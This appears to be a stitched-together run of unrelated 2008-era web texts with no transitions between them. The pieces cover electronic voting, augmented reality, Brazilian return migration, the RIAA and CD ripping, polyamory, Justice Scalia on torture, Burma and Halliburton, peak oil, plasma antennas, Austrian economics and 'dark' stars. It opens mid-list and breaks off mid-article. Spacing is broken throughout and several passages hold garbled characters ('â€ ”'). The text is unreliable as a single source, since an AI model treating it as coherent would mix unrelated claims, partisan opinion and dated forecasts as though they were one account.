8. ( 7 ) Joseph Stalin
9. (-) Noel Edmonds
10 . ( 10 ) The Devil and all his minions

“ We should at least get votes back on paper and get people counting them by hand . ”
As innocuous as these words may sound , they make me feel like I ’m on I - 35 in Minneapolis , headed toward the Mississippi bridge .
Ankle - deep in a presidential election year , I find myself without faith in the infrastructure of American civilization .
This is not what I ’d like to be writing about .
Our nation ’s soul is bleeding , its future up for grabs .
The candidates jockey for a mandate — our mandate — and they ’ll define it as narrowly as possible unless we define it for them .
How thoroughly and courageously do we repudiate the Cheney - Bush legacy ?
How resolutely do we move toward peace and global oneness ?
That ’s what 2008 is all about , right ?
Why , then , must I divert my attention from matters such as this and ponder . . . memory cards and molded plastic deflectors ?
Ah , democracy !
We ca n’t simply leave it to the voting machine vendors any more than we can leave it to the politicians .
The O -rings and gusset plates of democracy are poised to fail in every election ; every vote does not count .
The media and most government officials are still in denial about this , still dazzled by glitzy , electronic voting technology or maybe just trapped in their billion - dollar commitment to it .
Besides , when has technology ever gone backwards ?
But the call for paper ballots and hand counting — however jarring and quaint it may sound in the 21st century — comes most urgently not from Luddites or flat - Earthers but the technophiles and self - proclaimed geeks who understand computers most intimately , and know their vulnerabilities .
Bruce O’Dell , quoted above , is a security specialist who works with large - scale computer systems in the banking , insurance , bond - trading and related industries , and as a citizen has been one of those people tirelessly sounding the alarm about the dangers of electronic voting , a mission that has included , among much else , addressing legislative subcommittees in Texas and New Hampshire on voting machines .
For him , electronic voting is “ this fabulous ‘ solution ’ in search of a problem .
I just do n’t know what the problem is .
Speed of tabulation appears to be the only benefit ” — affecting , most noticeably , the ability of television networks to deliver winners and losers to the American public within an eyeblink of the polls ’ closing .
This is terrific , I guess , to the extent that democracy is a spectator sport .
To the extent that it ’s something else — e.g. , a yoking of power to the common good , a serious and private deliberation on national direction , a precise ascertainment of the consent of the governed — electronic voting contributes nothing but uncertainty .
And , of course , the possibility of widespread fraud .
For ATMs and all other electronic equipment , O’Dell points out , the foundation of our trust in them is proof of identification : PIN numbers and other means of user verification .
“ Precisely none of that occurs with voting . ”
It ca n ’t .
We vote in secret .
A vote , once cast , can never be linked to the one who cast it .
Because of this , the voter should be the one who puts his or her ballot in the ballot box — a ritualistic , indeed , sacred act of citizenship — with the assurance that the box ’s chain of custody will never be compromised : that it will never be out of official sight , that its contents will be emptied and counted with full public scrutiny .
With electronic voting — touchscreen ( DRE ) voting machines and optical - scan machines that are electronically tabulated — this is all lost .
In the case of DREs , we do not handle or even see our own ballots .
We surrender the most important functions of the election process to the programmers and service technicians of private companies , and to the vagaries of humidity and other factors that could compromise the accuracy of individual machines .
And , oh yeah , these systems are humongously expensive .
“ Why , ” asks O’Dell , with anger and wonder that reverberates from sea to shining sea , “ are we using machines ? ”
Yet our surrender to technology seems to have been accompanied by a remarkable surrender of all skepticism toward human behavior .
While security concerns are paramount in our financial and just about all other dealings ( try talking about gun control if you want to provoke a spasm of invective about human trustworthiness ) , we maintain a remarkable sense of denial that hunger for power could ever lead to breaches of democratic integrity .
What are you , a conspiracy theorist ?
No , but I ’m from Chicago and I cut my teeth as a reporter back in the waning days of the Daley ( Senior ) Machine , when precinct captains did n’t need no conspiracy to know they needed to deliver their precinct , or else , and would do what it took .
The quest for political power is raw and all too often dirty .
That basic truth has n’t changed .
If you are appalled by the insecurity of electronic voting , you have lots of options for staying informed and getting involved .
( Some Web sites to help you keep abreast as the primaries grind on are bradblog.com , ElectionDefenseAlliance.org and markcrispinmiller.blogspot.com . )
A movement of ordinary citizens to save our democratic birthright is growing .

BMW augmented reality Instead of following printed text instructions you can now use 3D - glasses to assemble the same tasks in a more effective and simple way .
Using augmented reality , the mechanic receives additional three - dimensional information on the engine he is repairing , for example , to help him in diagnosing and solving the fault .
Apart from the real environment , he sees virtually animated components , the tools to be used and hears instruction on each of the working steps through headphones integrated inside the goggles .
levelHead is a new conceptual game using techniques and tools from augmented reality .
Using tilt motions , the player moves a character through rooms that appear inside one of several cubes on a table .
Each room is logically connected by a series of doors , though some doors lead nowhere ( they are traps ) .
Are such games to be expected in the next years ?

No one can say how many are leaving .
But in the last half year , the reverse migration has become unmistakable among Brazilians in the United States , a population estimated at 1.1 million by Brazil ’s government — four to five times the official census figures .
To explain an often wrenching decision to pull up stakes , homeward - bound Brazilians point to a rising fear of deportation and a slumping American economy .
Many cite the expiration of driver ’s licenses that can no longer be renewed under tougher rules , coupled with the steep drop in the value of the dollar against the currency of Brazil , where the economy has improved .
“ You put it all together , and why should you stay in an environment like that if you have a place like Brazil , where there ’s hope , a light at the end of the tunnel and it ’s not a train to run you over ? ” said Pedro Coelho , a businessman in Mount Vernon , N.Y. , who is known as the mayor of Brazilians in Westchester County .
“ Are they leaving ?
Yes , by the hundreds . ”
In Massachusetts , says Fausto da Rocha , the founder of the Boston - area Brazilian Immigrant Center , his compatriots — many here illegally — are leaving by the thousands , some after losing homes in the subprime mortgage crisis .
In New York and New Jersey , travel agents and others who sell airline seats say that one - way bookings to Brazil have more than doubled since last year , to about 150 daily from Kennedy International Airport , and that flights are sold out through February .
And at Brazil ’s consulate in Miami , which serves Brazilians in five Southeastern states , officials said a recent survey of moving companies and travel agencies confirmed what they had already surmised from their foot traffic :
More Brazilians are leaving the region than arriving — the reversal of an upward curve that seemed unstoppable as recently as 2005 , when Brazilians unable to meet tightened visa requirements were sneaking across the United States - Mexico border in record numbers .

Just when you think someone could n’t be more out of touch with their customer base …
The RIAA goes and TOTALLY cements their record of complete insanity concerning what their customers have proven , time and again , that they want .
Here ’s the newest flash for all you music pirates out there .
And there are more of you than you might think , since the RIAA contends that …
Making a digital copy of ANY song from a legally purchased album that you yourself own , even if that digital copy is only for your own use , constitutes music piracy .
That ’s right , folks .
I ’ll admit right now .
I ’ve ripped every CD I own to digital copies .
In fact , over the next year I will re-rip all of them , as I ’d like higher quality digital copies than what I originally ripped .
And the RIAA can KMA as far as I ’m concerned .
I consider it more than fair use .
I do n’t have a CD player in my car .
I only carry digital copies with me , and only a subset of the whole at that .
And no one else is listening to either the digital copies or original CD at the same time .
This should really go down as the most ignorant business decision in the history of business , all the way to the first time one caveman paid another for a hunk of animal meat with a pair of shiny rocks .
Think of it like George Bush ’s cockamamie amnesty program for illegal aliens , in reverse .
And this is huge .
fracking .stupid ( just like the aformentioned amnesty program ) .
This runs counter to every idea of non-monopolistic commerce that has ever been .
The music industry , as a whole , has had at least 10 years to get their collective heads out of their collective backsides , and they ’ve steadfastly refused to do what needed to be done .
Which is work out a reasonable framework for electronic commerce , with actual use rights that make sense for the reality of digital playback .
Not that they have n’t had several options that have been floated past them .
Napster was a dead simple , no - brainer solution that anyone in their right mind should have recognized as a perfect system for the music companies to ride into the next millenium .
Think of it as the eBay for the music industry .
Which they promptly litigated into insignificance .
And then there ’s iTunes .
Which they are also trying to squeeze into oblivion .
Here ’s a question …
An artist ’s video is uploaded to YouTube .
What ’s to stop me from recording the audio from that video while it plays ?
What will the RIAA suggest next ?
A ban , or worse yet , a surcharge on short audio cables ?
Honestly …
There ’s only one response that makes sense for consumers .
An outright boycott of packaged retail music from members of the RIAA .
It ’s not they have n’t been price - fixing / gouging for years .
To the point of being sued for antitrust violations a few years ago .
Which the labels promptly used to send a big F - U to the rest of us by shipping millions of completely worthless CDs to libraries and schools as part of their settlement , basically dumping their trash on non-profits .
Real classy , huh ?
But it ’s time to get serious .
And here ’s a handy site that can help you out …
RIAARadar.com
This site can look up any release by artist , album , UPC code or label .
It ’s not 100 % , but it ’s pretty close .
Even better , it offers a mobile version that you can use to check UPC codes while you ’re on the go or in - store .
And there ’s a GreaseMonkey script which will pop up instant RIAA Radar results while you ’re browsing on Amazon .
So that ’s it .
Quit buying from the RIAA mafia .
Maybe they ’ll get the hint .
I doubt it tho .
They ’re already facing a 21 % decline .
And they steadfastly refuse to admit that the problem they have is one of their own making .

The internet is famous for hooking people up for everything from blind dates to political activism .
For people into polyamory – a way of life in which participants engage in multiple intimate relationships simultaneously , with the knowledge and consent of everyone involved – the internet provided a handy label for their lifestyle and a launch pad for injecting the concept into mainstream consciousness .
" Around 1990 , we found this nifty name to call ourselves , instead of ' responsible , consensual nonmonogamy , ' " says Dr. Kenneth Haslam , a retired anesthesiologist and curator of the Kenneth R. Haslam Collection on Polyamory at The Kinsey Institute for Research in Sex , Gender , and Reproduction .
" About that same time , the internet came along – and it was at exactly the right time .
The internet is a tipping point for polyamory . "
From its somewhat murky etymological past to 1992's creation of the alt .
polyamory Usenet newsgroup , the term has swept to mainstream acceptance : Polyamorist , polyamorous and polyamory made the Oxford English Dictionary in 2006 , and these days , polyamory ( poly for short ) is more visible than ever .
The Washington Post ran a long feature on the subject for Valentine 's Day , while actress Tilda Swinton 's relationship status – she 's part of a poly triad – seems to have garnered as much press as her Oscar win .
While having multiple committed partners is not a new concept , many polyamorists have told me they felt lost , guilty , alone or freakish until they came across the word polyamory on the internet and for the first time had a context for the way they felt about love .
" You can argue that before the internet , the poly community did n't exist , " says Franklin Veaux , author of What , Like , Two Girlfriends ? , a respected polyamory FAQ .
" There 's no question that the rise of the internet and the rise of polyamory coincided , although poly does predate the net by 6,000 years or so . "
Geeks have not traditionally been viewed as relationship experts , yet as a subculture , we are open to alternative ways of life .
We immerse ourselves in science fiction and fantasy , imagining other cultures and experiencing relationships not necessarily bound by puritanical traditions .
" I remember thinking that the fairy tale does n't make any sense , because if the princess lives in a castle , why should she have to choose one of the two princes ?
Castles are big and there 's room for all three of them , " says Veaux , who was raised in a Nebraska town of 275 people , with not a poly role model in sight .
" I grew up in middle - class suburbia unaware of any alternatives but one , very negative : monogamy or slut , " says Sharra Smith , one of Veaux 's partners .
" I tried to be monogamous and failed miserably ; after a very bad relationship , I said , ' That 's it , no more , I 'd rather be a slut . '
Then I learned there 's a middle ground . "
Cunning Minx , creator and host of the Polyamory Weekly podcast , says she 's seen a significant change in how the mainstream media treats polyamory in just the three years since her first episode .
" Poly used to be so alternative you had to adopt this entire different culture [ to participate ] , " she says .
" While it 's definitely still an emotional and spiritual upheaval for many people to shake off the paradigms of monogamy that are so ingrained in us , now you can meet poly people in a group and talk about it in a safe place . "
Polyamory is just the kind of thing you 'd expect in an era of love without borders , where time and distance no longer prevent us from finding true mates , and when no one has to live alone with their kink , desire , fantasy or love style – because someone , somewhere shares it .
" A lot of people are trying [ polyamory ] , but we do n't have any models for this kind of relating , " says Anita Wagner , author of the Practical Polyamory blog .
" There 's a tremendous demand for resources , information , guidance , help . "
Wagner and Minx both praise OKCupid , a mainstream dating service that has adapted its profiles to include polyamorists , and Wagner says Meetup has been invaluable in helping people find one another .
" Google polyamory and a city , and you find that major cities have sizeable poly communities , " Wagner says .
" In the vast majority of the country , it 's very small still , but people are meeting each other in smaller towns ....
Social networking has worked really well for poly people , who sometimes establish long - distance relationships because that 's where the people are who they are compatible with . "
Beyond the obvious benefits of online community , the language 's internet - speed evolution continues to give polyamory a boost .
When poly or poly - curious people stumble across the polyamorous lexicon , the discovery can help validate their worldview .
" We need to get away from the idea that there 's only one right way to live , " Veaux says .
" That idea has arguably caused more destruction and more damage to more societies over history than any other single idea you can name . "

Some torture may not be " cruel and unusual punishment " , says Scalia
Justice Antonin Scalia told the BBC that " smacking someone in the face " could be justified if there was an imminent threat .
" You can't come in smugly and with great self satisfaction and say ' Oh it 's torture , and therefore it 's no good ' , " he said in a rare interview .
He also accused Europe of being self - righteous over the death penalty .
Justice Scalia is known as the most acerbic member of the Supreme Court , and is often described as the most conservative of the court 's judges .
Pain infliction
In the interview with the Law in Action programme on BBC Radio 4 , he said it was " extraordinary " to assume that the ban on " cruel and unusual punishment " - the US Constitution 's Eighth Amendment - also applied to " so - called " torture .
Is it really so easy to determine that smacking someone in the face to determine where he has hidden the bomb that is about to blow up Los Angeles is prohibited in the constitution ?
Justice Antonin Scalia
Justice Scalia argued that courts could take stronger measures when a witness refused to answer questions .
" I suppose it 's the same thing about so - called torture .
Is it really so easy to determine that smacking someone in the face to determine where he has hidden the bomb that is about to blow up Los Angeles is prohibited in the constitution ? " he asked .
" It would be absurd to say you could n't do that .
And once you acknowledge that , we 're into a different game .
" How close does the threat have to be ?
And how severe can the infliction of pain be ? "
Death penalty
Justice Scalia also mocked European criticism of the US use of the death penalty .
" If you took a public opinion poll , if all of Europe had representative democracies that really worked , most of Europe would probably have the death penalty today .
" There are arguments for it and against it .
But to get self - righteous about the thing as Europeans tend to do about the American death penalty is really quite ridiculous . "
His position was fiercely criticised by Professor Conor Gearty of the London School of Economics , one of Britain 's leading experts on human rights law .
" Antonin Scalia works hard to protect himself from having to think seriously about torture , " he said .
" His devices are quite obvious , the idea of a smack on the face - rather than sensory deprivation , or waterboarding or any of the Abu Ghraib images - and the comment about ' so - called torture ' ... "
Professor Gearty accused Justice Scalia of creating a " nightmare scenario of mass destruction that all defenders of torture so need , to hide the fact that the reality of torture will be quite different " .
Law in Action will be broadcast at 1600 on Tuesday 12 February on Radio 4 .
The programme is also available as a podcast from bbc.co.uk / podcasts
First things first .
It 's Burma , not Myanmar .
It was Burma before it was part of the British Empire .
It was Burma when George Orwell â€ ” then Eric Blair , a police officer for the British Empire â€ ” learned enough about imperialism and " Big Brother " to fuel one of the most important writing careers of the 20th century .
It was Burma when it was overrun by the Japanese in 1942 .
It was Burma when it offered the fiercest resistance to Japanese occupation of any country in Asia during World War II .
It was Burma when it won its independence from Great Britain in 1948 .
And it is Burma today , at least in the hearts of those citizens who 've been rounded up , tortured , raped and seen family members killed by the State Law and Order Restoration Council and State Peace and Development Council â€ ” names Orwell would love â€ ” since 1988 .
It was Burma when the pro-democracy political party of Aung San Suu Kyi , Nobel Peace Prize recipient , won a landslide victory in 1990 .
It was still Burma when the junta nullified the results and placed the elected president ( Aung San Suu Kyi ) under house arrest .
It was Burma when Pres. Clinton awarded Aung San Suu Kyi the Medal of Freedom in Nov. 2000 , the highest civilian honor offered by the U.S. government .
Yes , this much is known .
What is not known is what will become of Burma now that the junta has cracked down on the biggest uprising since 1990 .
If history is any guide , nothing substantively will be done to help the victims of the junta in 2007 .
A few more Burmese refugees who 've been living for years in Thai refugee camps have been resettled here .
The White House has vowed to " tighten sanctions " against the junta .
And the U.N. has issued a few resolutions of condemnation , and so on and so forth .
* * * *
There 's another reason I can't take seriously any cries of indignation from the Bush White House , or from the editorial pages of the Wall Street Journal .
That 's because military juntas are good for big business .
During Dick Cheney 's five years as Halliburton CEO , he courted clients in regimes that flagrantly violated human rights including Indonesia , Azerbaijan , Libya , Nigeria , China and ( yes ) Iraq and Iran .
But the most extreme case of " constructive engagement " â€ ” a euphemism U.S. businesses use to justify profiting from otherwise unrepentantly despotic regimes â€ ” was Halliburton 's dealings with Burma .
Though the U.S. government had officially severed diplomatic ties with " Myanmar " and most U.S. corporations pulled up stakes and left , Halliburton stayed .
Indeed , Cheney helped broker a deal for a major pipeline project in Myanmar of which a federal judge later noted " the Halliburton venture already knew the project was benefiting from forced Burmese labor and ' numerous acts of violence ' by Myanmar 's military . "
Even as late as Dec. 2000 , the U.S. Defense Department announced that it would stop selling clothing imported from Myanmar at military bases .
But Halliburton remained untroubled by any of this and still kept its office open in Rangoon .
To recap : Cheney profited from human slavery , without flinching or remorse .
The American junta that he now leads will not lay a glove on Burma 's junta .
People around the world rallied last Saturday ( including in Hartford ) to express solidarity with the Burmese people .
The Foundation for the People of Burma offers many other ways to help .

NOTE : May 2009 —
For further updates on the oil price , see also :
The price of oil : 3 — energy economics and the financial crisis ;
The price of oil : 4 – a rising road ahead .
It was a chilly evening in early February when the Managing Director called us all together .
He paused a moment , glanced at the expectant faces all around him , and then he started .
Business is tough , he said , and we ’re doing what we can .
But finally , we ’ve reached that moment when we ’ve got to let some of you go .
A hundred of us stood there then , looking at each other , at the floor , and at the winter ’s dusk outside .
There was silence .
Some more explanation was required , and some more honesty was needed .
And , to his credit , Mitch provided it .
As ‘ this company is going down the toilet ’ talks go , it was pretty fairly done .
We ’d had problems with one of our installations in the North Sea , he told us .
We all knew that already .
In the big money business of finding oil and gas and getting them to the beach , failing on either of those priorities was never good .
An asset team would miss its targets , and there ’d be no bonuses or payrises for anyone ahead .
Such is business , in any organisation .
But this time , it was worse .
It ’s the oil price , he said .
February , 1999 .
On that day nine years ago , the price of Brent Crude Oil from the North Sea stood at $ 9.80 a barrel , having fallen off a cliff to $ 9.20 in the December before .
Even then , it cost more than $ 12 a barrel to produce , and we were losing money on every barrel we delivered .
It ’s getting worse , he said , and we ca n’t see how it ’s going to end .
And no one could .
An analyst ’s report in The Economist in the spring of 1999 said that with $ 10 oil a reality , there was nothing to stop a fall to $ 5 .
The market had changed , and changed for ever .
There was a world glut of oil , with no resolution in sight .
Surely there are two sentences which should strike fear into the heart of any speculator , or anyone who has ever bought a house .
‘ A structural change in the market ’ – that ’s one .
And , ‘ It ’s different this time ’ – that ’s another .
It was n’t then .
But it is now .
In 1999 , world oil production was at 75 million barrels of oil a day , and the Asian and Russian financial crises had removed enough demand , temporarily , to send the oil price plummeting .
Less than a decade later , the world is consuming 85 million barrels of oil a day , and produces almost exactly that much .
Within five years from that evening in 1999 , the price of oil had more than tripled to $ 34 a barrel .
It doubled again to $ 70 by the summer of 2005 .
And a few weeks ago , in January 2008 , a barrel of Brent Crude Oil was trading at $ 98 .
In the space of just nine years , the price of oil had risen by exactly ten times .
In 1999 , the North Sea was at its peak .
UK oil production averaged 2.7 million barrels of oil per day that year .
Further afield , Girassol , the first of a series of giant fields offshore Angola , had recently been discovered by Elf , and a string of new international successes followed .
For a while .
By 2008 , only nine years later , the UK ’s production is down by almost half , at 1.4 million barrels of oil per day .
This country is still a world - class oil and gas producer , and the North Sea will yield petroleum for another three decades to come .
But not at the same rate .
The basin has passed its peak , and production is declining by around 4 % each year .
The North Sea is just one hydrocarbon basin amongst many all around the world .
But they all follow the same trend .
Every dog has its day , and every oil and gas province ever found is eventually drained .
For as long as we do n’t invest massively in alternative energy , then we ’ll have to keep finding new reserves .
But what if we can ’t ?
With highly memorable exceptions in 1973 and 1979 , world petroleum supply has always risen to meet demand .
Maybe not much longer , since production looks remarkably flat , these days .
In 2007 , the Bush administration and Gordon Brown each called on the Middle East to boost production and stem the rise in oil prices .
But the OPEC states can’t manage that trick any more .
Petroleum supply in 2006 was slightly lower than in 2005 .
Early data for 2007 suggest that supply was static , or falling slightly further still .
So here ’s the paradox .
We ’re not running out of oil – and we wo n’t , for years to come .
But right now we ca n’t pump oil and gas faster to meet new growth in world demand .
Oil and gas production is virtually at its peak .
That ’s why it really is different this time .
It was in December that I bought petrol at over £ 1 a litre for the first time ( that ’s $ 7.60 a US gallon , by the way ) .
That might seem a high price to pay , until you realise that the UK ’s petrol costs just about the same as milk .
That ’s remarkable , when you consider the technology and effort required to bring it to the pumps .
Petrol costs in Europe are largely sheltered from escalating oil prices because taxes on fuel are so high .
Until recently , we ’ve also been protected by the falling dollar .
But prices are still rising – and petrol is at 104.9 p a litre in London as I write today .
The North American consumer is not so protected .
I can remember the outcry when gasoline first rose to $ 1 a gallon .
And then $ 2 , and $ 3 at one time , too .
But that ’s just the start – and even a recession in North America may not make much difference now .
Because what will a recession do ?
A drop in GDP of 1 or 2 % , for a year or two , with a slow recovery to follow ?
That ’s just not going to cut it .
Even if the phenomenal economic growth in India and China grinds to a total standstill , which seems unlikely , then static world demand ca n’t change the fundamentals of depletion .
The North Sea shows that the decline from peak production in any basin can be swift – by 4 % a year , remember , or as much as 50 % within a decade .
With so many hydrocarbon - producing basins around the world , we can hope that the decline will be more gentle than that , when it comes .
But make no mistake , a decline is coming , and it ’s not that far away .
In January 2008 , the oil price touched $ 100 .
It ’s slipped to $ 87 today .
That ’s not surprising , since the value of any commodity is always subject to the direction of the market – that weight of speculation which can add or subtract 30 % from the fundamentals , at any given time .
The oil price may fall further in the next few months – perhaps to as low as $ 60 , or a little less .
But let ’s not get too excited about $ 60 – that ’s just the level of twelve months ago .
Prices will rise again , eventually , and we wo n’t have long to wait – since the economics of falling supply and rising demand make that a rising certainty .
Let ’s be clear .
This is n’t about $ 100 oil .
In the near future you can add another 50 % , or even double that figure , and just keep on going .
What ’s the world going to look like with oil at $ 200 , $ 300 , $ 400 a barrel ?
That ’s a crazy notion – it sounds like madness .
And if you think so , then just go back and read this post again .
So , let me reiterate .
The price of oil has risen 900 % within the last nine years .
It rose 50 % , year - on - year inside the last twelve months to reach that $ 100 peak .
Maybe not tomorrow , but before too long , you can double that again .
And after that , you can just keep on going .
This world of ours is going to look very different , very soon .
Peak oil is happening , and it ’s happening today .

UPDATE 30.04.2008
When this article appeared in February 2008 , the oil price stood at $ 87 , down from $ 100 in January .
Less than three months later , the oil price is hovering close to $ 120 .
The graph below from The Independent illustrates that rise .
Today ’s oil price is at around 400 % of the January 2004 level , and close to 250 % of the figure for January 2007 .
Will the curve level off , or will it continue to extrapolate upwards ?
That ’s the subject for a fascinating debate .
A new antenna made of plasma ( a gas heated to the point that the electrons are ripped free of atoms and molecules ) works just like conventional metal antennas , except that it vanishes when you turn it off .
That 's important on the battlefield and in other applications where antennas need to be kept out of sight .
In addition , unlike metal antennas , the electrical characteristics of a plasma antenna can be rapidly adjusted to counteract signal jamming attempts .
Plasma antennas behave much like solid metal antennas because electrons flow freely in the hot gas , just as they do in metal conductors .
But plasmas only exist when the gasses they 're made of are very hot .
The moment the energy source heating a plasma antenna is shut off , the plasma turns back into a plain old ( non conductive ) gas .
As far as radio signals and antenna detectors go , the antenna effectively disappears when the plasma cools down .
This prototype plasma antenna is stealthy , versatile , and jam - resistant .

The antenna design being presented at next week 's APS Division of Plasma Physics meeting in Orlando consists of gas - filled tubes reminiscent of neon bulbs .
The physicists presenting the design propose that an array of many small plasma elements could lead to a highly versatile antenna that could be reconfigured simply by turning on or off various elements .

The Role of the Crisis
The so - called " credit crisis " is gaining momentum .
Investors increasingly question the solidity of the banking system , as evidenced by banks ' tumbling stock prices and rising funding costs .
With bank credit supply expected to tighten , the profit outlook for the corporate sector , which has benefited greatly from " easy credit " conditions , deteriorates , pushing firms ' market valuations lower .
In fact , peoples ' optimism has given way to fears of job losses and recession on a global scale .
Free market advocates , however , should not get carried away by the price action in the market place .
In a free market , there is nothing wrong with individuals reassessing hitherto held expectations , entailing changes in relative prices .
A free market is a discovery process , based on trial and error .
Usually the effects of errors made by some are compensated for by the gains of successful decisions taken by others , and the economy expands .
Sometimes , however , the effects of errors dominate , and the economy experiences what people call a crisis : income growth is ( feared to be ) lower than what people think it should , and could , be .
In that sense a crisis is a correction of bad decisions .
It is an indispensable part of the free market .
It pushes those producers out of business who do not satisfy the needs of their clients , and it rewards those who serve their customers well .
A crisis must be feared , however , if it has been caused by government action , and if the obvious signs of the crisis provoke ever greater doses of government intervention .
In this case , the market would be prevented from doing its job properly .
Bad decisions would be perpetuated , and the ultimate crisis may become nasty .
Diagnosing the Causes of the Crisis
It is against this background that one may wish to review the US central bank 's series of rate cuts , the latest being a big 75 - basis - points rate slash on January 22 , 2008 , which brought the official Fed Funds Target Rate to 3.5 % .
[ 1 ]
While the Fed 's moves were mostly hailed in public as appropriate measures to help the economy avoid recession , Austrian economists hold a completely different view .
According to the Austrian Monetary Theory of the Trade Cycle it is the government - run money - supply monopoly that has not only caused the crisis ; the theory also diagnoses that rate cuts will not solve the crisis , but will make it even worse .
Central banks , the government agents holding the power over the printing press , pursue a monetary policy of " interest rate steering " or , in other words , pushing the interest rate down as much as possible by relentlessly increasing credit and money supply .
It is this inflationary monetary policy that causes trouble .
Ludwig von Mises pointed out that
today credit expansion is exclusively a government practice .
As far as private banks and bankers are instrumental in issuing fiduciary media , their role is merely ancillary and concerns only technicalities .
The governments alone direct the course of affairs .
They have attained full supremacy in all matters concerning the size of circulation credit .
While the size of the credit expansion that private banks and bankers are able to engineer on an unhampered market is strictly limited , the governments aim at the greatest possible amount of credit expansion . [ 2 ]
Initially , the artificial lowering of the interest rate creates an illusion of richness and affluence .
The increase in the money stock via bank credit expansion erroneously suggests that the supply of savings increases .
Investment picks up , and the economy expands .
The illusion of plentiful resources leads to malinvestment , and sooner or later the boom turns into a bust .
While the money - fueled expansion is a manifestation of the crisis , it is actually the slump — the correction of malinvestment — that people complain about .
The alleged fight against the crisis
Once a crisis unfolds , central banks are called upon to lower interest rates — in ignorance of the fact that a monetary policy of pushing down the interest rate has caused the misery in the first place .
Cheaper borrowing costs , it is believed , would revive the economy by stimulating investment and consumption , thereby adding to output and employment .
Lower interest rates would raise the prices of stocks , bonds , and housing , translating into " wealth effects " which in turn strengthen demand .
The obsession with a policy of lowering the interest rate is rooted in a deep - seated ideological aversion against the interest rate .
It is a destructive ideology , in particular if the government is in charge of the money supply .
Because then the government central bank will lower the interest rate to whatever is deemed appropriate from the viewpoint of the government , pressure groups , and vested interest .
However , the interest rate is a reflection of peoples ' " time preference " : because of scarcity , people value goods and services available today ( " present goods " ) more highly than goods and services available at a later point in time ( " future goods " ) .
[ 3 ]
This is why present goods trade at a premium over future goods .
That premium is the interest rate , or the " time preference rate . "
The interest rate is a free - market phenomenon .
A policy of suppressing the market interest rate through a government - sponsored credit expansion , Mises noted , is a policy against the free market :
Credit expansion is the governments ' foremost tool in their struggle against the market economy .
In their hands it is the magic wand designed to conjure away the scarcity of capital goods , to lower the rate of interest or to abolish it altogether , to finance lavish government spending , to expropriate the capitalists , to contrive everlasting booms , and to make everybody prosperous . [ 4 ]
Causing Inflation
A monetary policy of lowering the interest rate via expanding credit and money corresponds to the widely held view that " some inflation " is a requisite for economic expansion .
In fact , the " inflation bias " has become so widespread that nowadays inflation ( the rise in the money supply ) is much less feared than deflation ( the decline in the money supply ) .
Mises was aware of what happens once the inevitable crisis caused by a manipulation of the interest rate unfolds :
" In the opinion of the public , more inflation and more credit expansion are the only remedy against the evils inflation and credit expansion have brought about . " [ 5 ]
The current credit crisis is a sad case in point : with monetary policy having caused inflation and malinvestment , it is now called upon to pursue a policy that leads to even more inflation and malinvestment .
Could monetary policy become " ineffective , " that is , could it fail to create inflation ?
For instance , the Bank of Japan 's rate cuts around the beginning of the 1990s — as a reaction to falling asset prices and a growing volume of bad loans in banks ' portfolio — did not succeed in bringing credit and money growth rates back to precrisis levels .
Even with official rates at virtually zero , the economy remained in stagnation and the Japanese stock market continued to decline .
Against the backdrop of the Japanese experience it should be noted that there is no limit to central - bank money printing .
Central banks can , at any one time , buy any assets from banks and nonbanks such as bonds , real estate , foreign currencies , etc .
If a central bank buys , say , debt from the corporate sector , it increases the money stock in the hands of nonbanks directly ; the commercial banking sector is not needed for increasing the money supply .
Central banks ' unlimited power over the money supply has been made pretty clear by the chairman of the US Federal Reserve , Ben S. Bernanke , in November 2002 :
[ T ]he U.S. government has a technology , called a printing press ( or , today , its electronic equivalent ) , that allows it to produce as many U.S. dollars as it wishes at essentially no cost .
By increasing the number of U.S. dollars in circulation , or even by credibly threatening to do so , the U.S. government can also reduce the value of a dollar in terms of goods and services , which is equivalent to raising the prices in dollars of those goods and services .
We conclude that , under a paper - money system , a determined government can always generate higher spending and hence positive inflation . [ 6 ]
So if the government is determined to create inflation , there should be hardly any doubt that there will be inflation .
The Fed 's series of rate cuts suggests that the bank tries to create additional credit and money via lowering the interest rate on base money .
But if such action fails to yield inflation , it does not take much to expect that the central bank may take recourse to less " regular " operations , if and when such an inflation policy is deemed necessary to solve the credit crisis .
So far , at least , US bank credit and money supply growth has remained at a very high level .
In December 2007 , banks ' commercial and industrial loans grew at 10.9 % y/y , and total bank loans and leases were up 10.8 % y/y. Real estate loans — most likely as a consequence of the defaults in the subprime markets — slowed down somewhat , but were still running at 6.3 % y/y.
Against this background the Fed rate cuts should actually accelerate the erosion of the exchange value of money further .
Threatening Freedom
Inflation is a societal evil .
It redistributes real wealth from creditors to debtors .
It impairs the role of money as a means of exchange .
The efficiency of the market 's price mechanism is greatly reduced , encouraging bad decisions , which in turn harm peoples ' economic well - being .
At the end of the day , inflation is a serious threat to freedom .
The majority of the people , suffering badly from inflation , would most likely blame the free market for their plight , rather than blame the central bank for the debasing of the currency .
Mises noted :
Nothing harmed the cause of liberalism more than the almost regular return of feverish booms and of the dramatic breakdown of bull markets followed by lingering slumps .
Public opinion has become convinced that such happenings are inevitable in the unhampered market economy .
People did not conceive that what they lamented was the necessary outcome of policies directed toward a lowering of the rate of interest by means of credit expansion .
They stubbornly kept to these policies and tried in vain to fight their undesired consequences by more and more government interference . [ 7 ]
From the Austrian viewpoint , the current credit crisis appears to be a precursor of great inflation .
If a deliberate policy of great inflation is chosen in the United States , a monetary policy of debasing the currency would most likely also take hold in other currency areas of the world .
The credit crisis has become a threat to the free societal order : as people become dispirited with the free market order , the door would be pushed open for anti–free market policies .

The FOMC rate cut was made " in view of a weakening of the economic outlook and increasing downside risks to growth .
While strains in short - term funding markets have eased somewhat , broader financial market conditions have continued to deteriorate and credit has tightened further for some businesses and households . "

The " dark " stars may have been large and diffuse
Normal stars are powered by nuclear fusion reactions , where hydrogen atoms meld to form heavier helium .
But when the Universe was still young , there would have been abundant dark matter , made of particles called Wimps : Weakly Interacting Massive Particles .
These would have fused together and obliterated each other long before nuclear fusion had the chance to start .
As a result , the first stars would have looked quite different from the ones we see today , and they may have changed the course of the Universe 's evolution - or at least held it up .
The theory , published in the journal Physical Review Letters , depends on particles that astronomers can't see , but are certain exist , and physicists have never detected .
But the indirect evidence for their existence is overwhelming .
" Dark matter particles make up more than three - quarters of the mass of the Universe , " says theoretical physicist Katherine Freese from the University of Michigan .
" In fact , billions of them are passing through each of us every second . "
In the early Universe , there would have been even more .
Changing course
The nature of the first stars has long puzzled astronomers .
Immediately after the Big Bang , the Universe expanded and cooled , so that for millions of years it was filled with dark , featureless hydrogen and helium - and perhaps Wimps .
